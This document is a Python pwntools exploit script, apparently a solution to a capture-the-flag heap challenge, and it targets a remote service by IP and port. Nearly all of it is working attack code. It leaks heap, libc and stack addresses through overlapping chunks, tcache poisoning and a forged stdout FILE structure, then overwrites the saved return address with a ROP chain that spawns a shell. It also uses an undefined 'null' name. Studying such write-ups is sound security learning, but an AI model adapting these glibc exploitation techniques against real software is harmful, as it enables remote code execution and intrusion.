#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'john_wick_patched'
HOST = '103.77.175.40'
PORT = 6121

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x14dc
brva 0x16b7
brva 0x17cb
brva 0x19d9
brva 0x1ade
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# add payload, script here
def add(idx, name, age, height, len_desc, desc, bksec_coin):
    sla(b'> ', b'1')
    sla(b'Index: ', str(idx).encode())
    sa(b'Name: ', name)
    sla(b'Age: ', str(age).encode())
    sla(b'Height (cm): ', str(height).encode())
    sla(b'Length of description: ', str(len_desc).encode()) # <= 0x100
    sa(b'Description: ', desc)
    if bksec_coin != null:
        sla(b'6M$): ', str(bksec_coin).encode())
def delete(idx):
    sla(b'> ', b'2')
    sla(b'Index: ', str(idx).encode())
def view(idx):
    sla(b'> ', b'3')
    sla(b'Index: ', str(idx).encode())
def change_status(idx, status): # max 0x20 bytes
    sla(b'> ', b'4')
    sla(b'Index: ', str(idx).encode())
    sla(b'New status: ', status)
def edit(idx, desc):
    sla(b'> ', b'5')
    sla(b'Index: ', str(idx).encode())
    sa(b'New description: ', desc)

# leak heap by overlapping
add(0, b'A'*29, 20, 170, 0x37, b'B'*0x10, 0xe000)
add(1, b'C'*29, 20, 170, 0x57, b'D'*0x10, 0xe000)
delete(0)
delete(1)
add(0, b'E'*29, 20, 170, 0x57, b'\x00', 0xe000)
change_status(0, b'S'*0x20)
view(0)
rcu(b'Description: ')
heap_base = u64(p.recv(5).ljust(8, b'\x00')) << 12

# leak libc by free 8 chunks >= 0x90
for i in range(0, 9, 1):
    add(i+1, b'A' * 29, 20, 170, 0x87, b'B' * 0x10, 0xe000)
for i in range(9, 2, -1):
    delete(i)
change_status(2, b'S' * 0x20)
delete(2)
view(1)
rcu(b'Description: ')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x203b20

# leak stack via environ with fake stdout (tcache poisoning)
fp = FileStructure()
fp.write(libc.sym.environ, 0x8)
fp.flags = 0xfbad1804
payload = bytes(fp)[:0x30]
print(fp)
target = 0x2045c0 + libc.address

log.success(f'heap base: {hex(heap_base)}')
log.success(hex(libc.address))

for i in range(2, 10, 1):
    add(i, b'A'*29, 20, 170, 0x87, b'B'*0x10, 0xe000)
delete(2)
delete(9)
edit(1, p64(target ^ (heap_base >> 12)) + p64(0xdeadbeef))
add(2, b'A'*29, 20, 170, 0x87, b'B'*0x10, 0xe000)

# leak stack
add(9, b'A'*29, 20, 170, 0x87, payload, null)
stack = u64((p.recv(6)).ljust(8,b'\x00')) - 0x148
log.success(hex(stack))
sleep(0.5)

# overwrite saved rip with ROP
sl(str(0xe000).encode())
delete(3)
delete(1)
edit(2, p64(stack ^ (heap_base >> 12)) + p64(0xdeadbeef))
add(1, b'A'*29, 20, 170, 0x87, b'B'*0x10, 0xe000)
ret = libc.address + 0x000000000002882f
pop_rdi = libc.address + 0x000000000010f78b
binsh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
payload = flat(
    0x0, ret, pop_rdi, binsh, system # add saved rbp to prevent tcache unaligned (0x8)
)
add(3, b'A'*29, 20, 170, 0x87, payload, 0xe000)
sl(b'ls -la')

p.interactive()
